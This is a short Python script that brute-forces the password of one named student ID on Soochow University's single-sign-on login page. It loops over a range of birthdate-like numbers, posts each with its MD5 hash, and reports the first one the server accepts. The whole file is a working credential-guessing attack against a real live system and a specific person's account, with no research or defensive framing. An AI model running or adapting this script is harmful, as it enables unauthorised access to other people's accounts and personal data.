#! /usr/bin/env python
# encoding=utf-8

import requests
import hashlib
from bs4 import BeautifulSoup

def md5(str):
    m = hashlib.md5()
    m.update(str.encode("utf8"))
    return m.hexdigest()

IDToken1 = '1430705000'         #学号
# IDToken9 = 'xxxxxx'                   #密码
for IDToken9 in range(970000, 971231):

    IDToken2 = md5(str(IDToken9))         #密码的md5值

    payload = {'IDButton': 'Submit',
                'encoded': 'false',
                'goto': '',
                'gx_charset': 'UTF-8',
                'IDToken0': '',
                'IDToken1': IDToken1,
                'IDToken9': IDToken9,
                'IDToken2': IDToken2}
    url = 'http://ids1.suda.edu.cn/amserver/UI/Login?goto=http://myauth.suda.edu.cn/default.aspx?app=cjlr'

    res = requests.post(url, data = payload)

    soup = BeautifulSoup(res.text)
    isEmpty = soup.find('td', attrs={'style': 'font-weight:bold; font-size:14px'})
    if isEmpty != None:
        print(str(IDToken9) + isEmpty.getText().strip())
    else:
        # print(res.text)
        print(str(IDToken9) + ' is right!')
        break
